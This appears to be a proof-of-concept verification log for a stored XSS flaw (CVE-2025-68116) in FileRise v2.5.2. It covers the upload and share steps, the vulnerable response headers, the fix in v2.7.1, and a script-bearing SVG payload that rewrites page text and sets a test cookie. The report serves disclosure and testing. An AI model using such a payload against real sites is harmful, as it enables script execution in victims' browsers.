CVE-2025-68116 - FileRise Stored XSS via SVG Upload
============================================================
Target: http://localhost:8081
Version: FileRise v2.5.2

VULNERABILITY VERIFICATION:
============================================================

1. Upload malicious SVG file - SUCCESS
   Filename: xss_dom.svg

2. Create share link - SUCCESS
   Token: 24e00710371bf561594b0ba89fa28a4a

3. Access share link and check response headers:

   Share URL: http://localhost:8081/api/file/share.php?token=24e00710371bf561594b0ba89fa28a4a
   
   Response Headers:
   - Content-Type: image/svg+xml          <- VULNERABLE (renderable MIME type)
   - Content-Disposition: inline          <- VULNERABLE (not forced download)
   - X-Content-Type-Options: nosniff
   - Content-Security-Policy: ... script-src 'self' ...   <- Defense in depth

4. Browser verification:
   - SVG content rendered in browser (screenshot shows SVG text)
   - document.contentType confirmed as "image/svg+xml"
   
RESULT: VULNERABILITY CONFIRMED
============================================================

The vulnerability exists because:
- SVG files are served with Content-Type: image/svg+xml (browser renders them)
- SVG files are served with Content-Disposition: inline (not forced download)
- This allows browser to execute JavaScript within SVG context

Note: v2.5.2 has CSP headers that may block inline script execution as defense
in depth, but the core vulnerability (inline SVG rendering) is present.

Fix in v2.7.1:
- Content-Type: application/octet-stream (binary, not renderable)
- Content-Disposition: attachment (forced download)

Malicious SVG content used:
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="200">
  <text id="target" x="10" y="50" fill="black" font-size="20">Before XSS</text>
  <script type="text/javascript">
    var t = document.getElementById('target');
    if(t) {
      t.textContent = 'XSS EXECUTED!';
      t.setAttribute('fill', 'red');
    }
    document.cookie = 'xss_test=pwned';
  </script>
</svg>
